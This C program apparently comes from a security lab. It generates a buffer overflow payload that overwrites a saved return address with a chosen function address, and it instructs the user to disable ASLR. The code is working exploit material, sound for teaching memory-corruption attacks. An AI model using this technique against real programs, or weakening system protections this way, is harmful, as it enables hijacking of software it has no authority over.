#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

int main(int argc, char* argv[]) {

	if(argc < 4) {
		printf("./exploit <target function address> <buffer start address> <address of return address>\n");
		printf("Remember to turn off ASLR: sudo sysctl -w kernel.randomize_va_space=0\n");
		return 0;
	}
	
	uint32_t target_addr = (uint32_t) strtoul(argv[1], NULL, 16); // convert to base-16 hex
	uint32_t buf_addr = (uint32_t) strtoul(argv[2], NULL, 16);
	uint32_t ret_addr = (uint32_t) strtoul(argv[3], NULL, 16);

	int str_size = (ret_addr - buf_addr) + 4; // buffer size + addr ; 32-bit machines has 4-byte addresses
	printf("target addr %04x, buf_addr %04x, ret_addr %04x, str_size %i\n", target_addr, buf_addr, ret_addr, str_size);
	printf("Remember to turn off ASLR: sudo sysctl -w kernel.randomize_va_space=0\n");
	
	// separate the target_addr into 4 bytes
	unsigned char target_addr_b[4];
	memcpy(target_addr_b, &target_addr, sizeof(uint32_t)); // reverses the address for little-endian format
	for(int i=0; i<4; i++) {
		printf("byte %i = %02x\n", i, target_addr_b[i]);
	}

	unsigned char* str = malloc(str_size);
	memset(str, 'a', str_size); // 'a' is arbitrary	
	unsigned char* ptr = str + str_size - 4;
	for(int i=0; i<4; i++) {
		*ptr = target_addr_b[i];
		ptr++;
	}

	//printf("Attack string: \n");
	//for(int i=0; i<str_size; i++) {
	//	printf("%i) %02x\n", i, str[i]);
	//}
	
	FILE* f = fopen("attack.input", "wb");
	if(!f) {
		printf("Failed to open file.\n");
		return 0;
	}
	
	fwrite(str, str_size, 1, f);
	fclose(f);

	printf("Exploit file attack.input was created.\n");
	return 0;
}
